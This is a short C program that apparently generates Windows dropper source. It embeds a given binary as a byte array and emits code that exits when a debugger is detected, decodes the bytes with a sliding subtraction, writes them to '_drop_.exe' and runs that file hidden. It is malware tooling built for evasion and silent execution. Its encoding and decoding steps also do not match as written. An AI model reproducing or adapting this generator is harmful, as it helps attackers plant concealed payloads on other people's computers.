#include <stdio.h>
int main(int argc, char *argv[])
{
	int ch, len = 0;
	FILE *file = fopen(argv[1],"rb");
	printf("#define WIN32_LEAN_AND_MEAN\n");
	printf("#include <stdio.h>\n");
	printf("#include <windows.h>\n");
	printf("const unsigned char SRC[] = {\n");
	while((ch = fgetc(file)) != EOF) {
		if(len == 0) printf("\t0x%.2X", (unsigned char)ch);
		else if((len % 12) == 0) printf("\n\t,0x%.2X", (unsigned char)ch);
		else printf(",0x%.2X", (unsigned char)ch);
		len++;
	}
	printf("\n};\n");
	printf("int main(void) {\n");
	printf("char ThisPath[256];\nGetModuleFileName(NULL,ThisPath,sizeof(ThisPath));\n");
	printf("FILE *thisfile = fopen(ThisPath,\"rb\");\n");
	printf("if(IsDebuggerPresent()) return 1;\n");
	printf("int i, slide = 0;\n");
	printf("FILE *file = fopen(\"_drop_.exe\",\"wb\");\n");
	printf("for(i=0;i<sizeof(SRC);i++) fputc((unsigned char)SRC[i]-(++slide),file);\n");
	printf("fclose(file); WinExec(\"_drop_.exe\",SW_HIDE); return 0;\n}\n");
	fclose(file);
	return 0;
}
